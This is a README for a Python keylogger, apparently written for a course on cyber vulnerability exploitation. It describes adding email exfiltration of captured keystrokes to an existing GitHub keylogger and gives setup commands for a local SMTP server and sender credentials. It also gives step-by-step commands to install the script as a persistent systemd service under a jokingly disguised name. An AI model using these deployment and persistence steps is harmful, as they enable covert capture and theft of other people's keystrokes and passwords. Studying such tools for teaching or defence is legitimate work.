# This keylogger was made for Cyber Vulnerability Exploitation
### Based off of the following keylogger already found on github 
### Added functionality for the file to then be exfiltrated

- https://github.com/GiacomoLaw/Keylogger/tree/master/linux
- https://realpython.com/python-send-email/

### This logger requires for a local SMTP Server to be started and for the requirements file to be installed

#### On Linux
- sudo python -m smtpd -c DebuggingServer -n localhost:1435
- pip install -r requirements.txt

### Please upon use change the following variables to suit your needs.
- sender_email
- receiver_email
- password

### This script can be run as a service in linux
Do the following:
- sudo nano /etc/systemd/system/DefinitelyNotAKeyLogger.service
- ensure that ExecStart=/usr/bin/python3 /directoryToYourFile/DefinitelyNotAKeyLogger.py
- sudo systemctl daemon-reload
- sudo systemctl enable DefinitelyNotAKeyLogger.service
- sudo systemctl start DefinitelyNotAKeyLogger.service

### IF the file is not able to be emailed
- The file will be saved to the same directory as the script.